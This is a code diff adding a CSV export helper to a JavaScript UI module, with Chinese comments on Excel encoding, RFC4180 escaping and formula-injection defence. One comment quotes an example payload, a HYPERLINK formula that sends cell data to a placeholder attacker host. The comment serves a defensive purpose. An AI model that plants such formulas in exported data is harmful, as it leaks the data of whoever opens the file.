@@ -215,9 +215,45 @@
     return '<div class="pager">' + parts.join("") + '<span class="pg-info">第 ' + page + ' / ' + totalPages + ' 页</span></div>';
   }
 
+  /**
+   * 导出 CSV 并触发浏览器下载。
+   *
+   * 三个易错点（都不是"能不能下载"的问题，而是"下载下来的文件能不能用/安不安全"）：
+   * 1. **必须加 UTF-8 BOM**：不加时 Excel 按本地代码页解释，中文全是乱码 ——
+   *    这是"导出功能做了但没人用"的最常见原因，且只有真的用 Excel 打开才会发现。
+   * 2. **按 RFC4180 转义**：单元格含逗号/引号/换行时要用双引号包住并把内部 `"` 写成 `""`，
+   *    否则字段里的逗号会把一行拆成两列，表格从此错位且无法恢复。
+   * 3. **防公式注入**：以 `= + - @` 开头的单元格前置单引号。审计日志的"操作人/对象"
+   *    来自用户可控数据，Excel 会把 `=HYPERLINK("http://attacker/?"&A1)` 当公式执行，
+   *    点开表格即外带数据 —— 这条在导出审计日志时尤其要紧。
+   *
+   * @param {string} filename 下载文件名（含 .csv）
+   * @param {string[]} headers 表头
+   * @param {Array<Array<any>>} rows 数据行
+   */
+  function downloadCsv(filename, headers, rows) {
+    const cell = (v) => {
+      let s = v === null || v === undefined ? "" : String(v);
+      if (/^[=+\-@\t\r]/.test(s)) s = "'" + s;
+      return /[",\r\n]/.test(s) ? '"' + s.replace(/"/g, '""') + '"' : s;
+    };
+    const lines = [headers.map(cell).join(",")]
+      .concat((rows || []).map(r => (r || []).map(cell).join(",")));
+    const blob = new Blob(["\uFEFF" + lines.join("\r\n")], { type: "text/csv;charset=utf-8;" });
+    const url = URL.createObjectURL(blob);
+    const a = doc.createElement("a");
+    a.href = url;
+    a.download = filename;
+    doc.body.appendChild(a);
+    a.click();
+    a.remove();
+    // 不能立即 revoke：部分浏览器在 click 后同步回收会让下载得到 0 字节文件
+    setTimeout(() => URL.revokeObjectURL(url), 10000);
+  }
+
   PG.ui = {
     esc, money, moneyK, pct, fmtMinutes, toast, modal, drawer, confirm, bind,
     badge, PARENT_STATUS, SUB_STATUS, ORDER_STATUS,
-    donut, line, bar, sparkline, pager,
+    donut, line, bar, sparkline, pager, downloadCsv,
   };
 })(window);
